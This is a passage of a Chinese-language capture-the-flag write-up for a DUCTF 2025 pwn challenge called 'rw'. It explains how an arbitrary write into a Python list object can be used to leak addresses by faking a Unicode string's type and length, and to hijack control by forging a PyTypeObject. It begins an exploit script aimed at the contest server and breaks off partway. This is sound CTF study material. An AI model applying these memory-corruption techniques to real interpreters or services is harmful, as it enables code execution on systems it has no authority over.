&quot;)[:-1] flag_part = [(chr(int(i.lstrip().decode()))) for i in flag_part] flag += &quot;&quot;.join(flag_part) io.close()for i in range(5): exp(i)print(f&quot;flag: &#123;flag&#125;&quot;) rw题目描述Dear MNGA, a read and a write, what more could you ask for? Regards,joseph 题目功能Ubuntu GLIBC 2.35-0ubuntu3.8 Python 3.10.12 12345678910111213141516while True: try: inp = input(&quot;&gt; &quot;) cmd, idx, *val = inp.split() idx = int(idx) match cmd: case &quot;r&quot;: print(a[idx]) case &quot;w&quot;: ctypes.cast( id(a) + idx, ctypes.POINTER(ctypes.c_char) )[0] = int(val[0]) case _: break except Exception as e: print(&quot;error:&quot;, e) 利用思路python list 结构体如下： 123456typedef struct &#123; PyObject ob_base; Py_ssize_t ob_size; PyObject **ob_item; Py_ssize_t allocated;&#125; PyListObject; 这次没有直接泄露地址了，但可以任意 offset 写对象a的内存 首先得实现泄露地址，我的做法是部分写改其中一个 item 的类型为 PyUnicode_Type ，然后把字符串大小改大，利用 r 功能打印出字符串泄露地址 PyUnicode_Type 结构体如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152//https://github.com/python/cpython/blob/f575588ccf27d8d54a1e99cfda944f2614b3255c/Include/cpython/unicodeobject.h#L111typedef struct &#123; /* There are 3 forms of Unicode strings: - compact ascii: * structure = PyASCIIObject * test: PyUnicode_IS_COMPACT_ASCII(op) * kind = PyUnicode_1BYTE_KIND * compact = 1 * ascii = 1 * (length is the length of the utf8) * (data starts just after the structure) * (since ASCII is decoded from UTF-8, the utf8 string are the data) - compact: * structure = PyCompactUnicodeObject * test: PyUnicode_IS_COMPACT(op) &amp;&amp; !PyUnicode_IS_ASCII(op) * kind = PyUnicode_1BYTE_KIND, PyUnicode_2BYTE_KIND or PyUnicode_4BYTE_KIND * compact = 1 * ascii = 0 * utf8 is not shared with data * utf8_length = 0 if utf8 is NULL * (data starts just after the structure) - legacy string: * structure = PyUnicodeObject structure * test: !PyUnicode_IS_COMPACT(op) * kind = PyUnicode_1BYTE_KIND, PyUnicode_2BYTE_KIND or PyUnicode_4BYTE_KIND * compact = 0 * data.any is not NULL * utf8 is shared and utf8_length = length with data.any if ascii = 1 * utf8_length = 0 if utf8 is NULL Compact strings use only one memory block (structure + characters), whereas legacy strings use one block for the structure and one block for characters. Legacy strings are created by subclasses of Unicode. See also _PyUnicode_CheckConsistency(). */ PyObject_HEAD Py_ssize_t length; /* Number of code points in the string */ Py_hash_t hash; /* Hash value; -1 if not set */ /* Ensure 4 byte alignment for PyUnicode_DATA(), see gh-63736 on m68k. */ _Py_ALIGNED_DEF(4, struct _PyUnicodeObject_state) state;&#125; PyASCIIObject; 从字符串结构体可以看到有三种字符串类型，这里设置为 compact 类型直接泄露出结构体后面的内存。 经过调试发现 a 与 a[1] 的偏移固定，篡改 a[1] 泄露出 pie 然后将 a[1] 类型改为 PyBytesIter_Type 再打印可以泄露出当前对象也就是 a[1] 的地址 最后伪造 PyTypeObject 劫持 vtable 上的函数指针，和 fakeobj 题目一样 #!/usr/bin/env python&quot;&quot;&quot; author: St4ckC00ki3&quot;&quot;&quot;from pwncli import *filename = &quot;/usr/bin/python3&quot;libcname = &quot;&quot;host = &quot;chal.2025.ductf.net&quot;port = 30004elf = context.binary = ELF(filename)context.terminal = [&quot;tmux&quot;, &quot;neww&quot;]context.log_level = &quot;debug&quot;if libcname != &quot;&quot;: libc = ELF(libcname)gs = &quot;&quot;&quot;&quot;&quot;&quot;def start(): if args.GDB: return gdb.debug([elf.path, &quot;rw.py&quot;], gdbscript=gs) elif args.REMOTE: return remote(host, port) else: return process([elf.path, &quot;rw.py&quot;])p = start()def leak_address(): if context.arch == &quot;i386&quot;: return u32(p.recv(4)) else: return u64(p.recv(6).ljust(8, b&quot;\x00&quot;))def leak_address2(timeout=0.2): contains = b&quot;\x7f&quot; if context.bits == 64 else b&quot;\xf7&quot; m = p.recvuntil(contains, timeout=timeout) if contains not in m: raise RuntimeError(&quot;Cannot get libc addr&quot;) if context.bits == 32: return u32(m[-4:]) else: return u64(m[-6:])def dbg(): if args.AT: gdb.attach(p, gs) pause()s = lambda x: p.send(x)sl = lambda x: p.sendline(x)sa = lambda x, y